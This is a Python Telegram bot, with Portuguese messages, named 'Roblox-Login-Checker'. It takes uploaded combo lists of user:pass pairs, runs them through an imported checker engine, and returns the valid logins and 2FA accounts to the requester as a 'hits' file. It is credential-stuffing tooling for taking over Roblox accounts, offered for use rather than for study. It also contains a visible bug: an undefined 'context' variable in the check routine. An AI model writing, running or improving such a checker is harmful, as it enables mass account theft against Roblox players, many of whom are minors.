import os, datetime, asyncio, logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import TOKEN, ADMIN_ID
from checker import engine
from aiofiles import open as aopen

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

QUEUE = asyncio.Queue()
STATS = {"total":0, "hit":0, "fail":0, "start":None}

async def start(update: Update, _):
    await update.message.reply_text(
        "🤖 Roblox-Login-Checker\n"
        "Envie um arquivo .txt com formato user:pass para começar.")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("📄 Apenas .txt é aceito.")
        return
    file = await doc.get_file()
    local = f"combo/{user}_{int(datetime.datetime.now().timestamp())}.txt"
    await file.download_to_drive(local)
    STATS["start"] = datetime.datetime.now()
    await update.message.reply_text("🔍 Check iniciado… Aguarde.")
    asyncio.create_task(_run_check(local, update.effective_chat.id))

async def _run_check(path, chat_id):
    global STATS
    asyncio.create_task(_consumer(QUEUE))          # despachante de hits
    await engine(path, QUEUE)
    await asyncio.sleep(2)                         # aguarda fila esvaziar
    hits_file = f"hits/{os.path.basename(path).replace('.txt','_hits.txt')}"
    async with aopen(hits_file, "w") as f:
        while not QUEUE.empty():
            item = await QUEUE.get()
            await f.write(item+"\n")
    await context.bot.send_document(chat_id, document=open(hits_file,"rb"),
                                    caption="✅ Check finalizado – hits/2FA.")

async def _consumer(q):
    while True:
        line = await q.get()
        STATS["hit"] += 1
        logger.info(line)

async def stats(update: Update, _):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        f"📊 Total processado: {STATS['total']}\n"
        f"✅ Hits/2FA: {STATS['hit']}\n"
        f"⏱ Tempo: {datetime.datetime.now()-STATS['start']}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_doc))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    os.makedirs("combo", exist_ok=True)
    os.makedirs("hits", exist_ok=True)
    main()
